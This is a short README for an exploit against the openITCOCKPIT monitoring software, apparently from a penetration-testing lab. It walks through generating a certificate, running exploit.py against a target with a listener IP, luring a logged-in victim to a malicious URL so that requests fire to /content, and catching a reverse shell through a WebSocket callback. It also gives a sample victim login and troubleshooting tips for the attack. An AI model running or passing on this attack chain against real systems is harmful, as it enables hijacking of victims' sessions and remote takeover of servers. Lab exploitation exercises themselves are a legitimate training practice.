# OpenITcockpit

To run the exploit follow this steps.
1. Create a key pair in the script directory: 
```bash
openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
```
2. Run the exploit:
```bash
python3 exploit.py -t https://openitcockpit -l 192.168.45.243
```
![OpenITcockpit example 1](/.images/openitcockpit_0.png)

3. You will need to act as the victim, so go to the prompted URL and log in with `view@viewer.local:27NZDLgfnY`.

4. Once logged in, you should see several requests to `/content`.

![OpenITcockpit example 2](/.images/openitcockpit_1.png)

5. Finally, you will received a WSS callback with a reverse shell.

![OpenITcockpit example 3](/.images/openitcockpit_2.png)

## Known bugs
1. If you see the following error while executing the script, try to log in first and then run the exploit.

![OpenITcockpit bug 1](/.images/openitcockpit_bug_1.png)
1. If when you try to load the malicious URL you see this content, try to fetch in your browser the `client.js` file, then try to exploit the URL again.
> [!NOTE]
> This is usually for browser/CORS issue.

![OpenITcockpit bug 1](/.images/openitcockpit_bug_2.png)